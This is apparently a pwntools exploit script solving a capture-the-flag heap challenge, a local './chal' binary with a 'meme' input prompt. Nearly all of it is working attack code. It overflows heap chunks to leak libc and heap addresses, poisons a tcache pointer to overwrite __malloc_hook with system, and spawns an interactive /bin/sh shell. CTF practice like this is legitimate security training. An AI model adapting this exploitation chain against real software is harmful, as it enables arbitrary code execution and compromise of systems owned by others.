
from pwn import *

e = ELF("./chal")
libc = ELF("./libc.so.6", checksec=False)
context.binary = e

'''
Bits: 64

Stack:
Canary: Disabled
PIE: Disabled
Executable stack: No

Writable segments:
GOT: Yes
fini_array: No
'''

'''
gen_funcs([""], setup, __file__)
'''

def setup():
    return process("./chal")
    # return remote("localhost", 5000)

def send_meme(p, i, l=None):
    if l is None:
        l = len(i)
    p.sendlineafter(b"Enter length of meme:", str(l).encode())
    p.sendlineafter(b"Enter meme:", i)

def mem_cat(p, a, b):
    send_meme(p, a)
    send_meme(p, b)


if __name__ == '__main__':
    p = setup()

    # Not completely sure how this works but it allows us to create an unsort bin chunk
    # This will allow us to allocate more chunks even though the top chunk is screwed up
    mem_cat(p, b"X"*0x100+b"\0"*8+p64(0x431), p64(0x431)*(0x1008//8)+p64(0x31))
    # Allocate a new empty chunk. This will use the unsort bin chunk, allowing us to leak libc.
    mem_cat(p, b"", b"")
    leaked = u64(p.recvline(keepends=False)[1:]+b"\0\0")
    libc.address = leaked - 0x1ecbe0
    print(hex(libc.address))
    # Now we do the same thing with a tcache chunk to leak tcache addresses
    mem_cat(p, b"a"*0x28+p64(0x21), b"a"*0x28+p64(0x21))
    mem_cat(p, b"", b"")
    leak = p.recvline(keepends=False)[1:]
    heap_leak = u64(leak + b"\0"*(8-len(leak)))
    print(hex(heap_leak))

    # Create fake chunk of size 0x110.
    # We will overflow this chunk to overwrite the tcache pointer of another chunk later
    # We also create a fake chunk of size 0x120 to accommodate the 0x110 + 0x10 chunk we will malloc later
    # The unsort bin we created seems to be destroyed by this point

    mem_cat(p, b"X"*8+p64(0x111), b"a"*8+p64(0x121))

    total_size = 256
    # Spray lots of chunk headers so it will work
    # Also write /bin/sh into heap
    chunk1 = p64(0x121)*8+b"/bin/sh\0"
    chunk1 += b"b" * (0xa0- len(chunk1) - 0x8)
    chunk2 = p64(0x21)+p64(libc.sym.__malloc_hook)
    padding = b"d"*(total_size - len(chunk1 + chunk2) - 0x8)

    # We are allocated the fake 0x110 chunk. Overwrite the tcache ptr of some random chunk to point to __malloc_hook
    mem_cat(p, chunk1 + chunk2 + padding + p64(0x21), b"c"*8+p64(0x101))
    # Write __malloc_hook
    send_meme(p, p64(libc.sym.system)+p64(0))
    # system('/bin/sh') via malloc(heap_addr)
    # Luckily heap address is less than 32 bits
    p.sendlineafter(b"Enter length of meme:", str(heap_leak+0x1f0 - 0x1).encode())

    p.interactive()
